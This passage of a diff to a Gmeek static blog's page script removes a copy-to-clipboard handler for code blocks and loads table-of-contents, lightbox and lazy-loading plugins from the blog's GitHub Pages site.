3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -278,70 +277,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
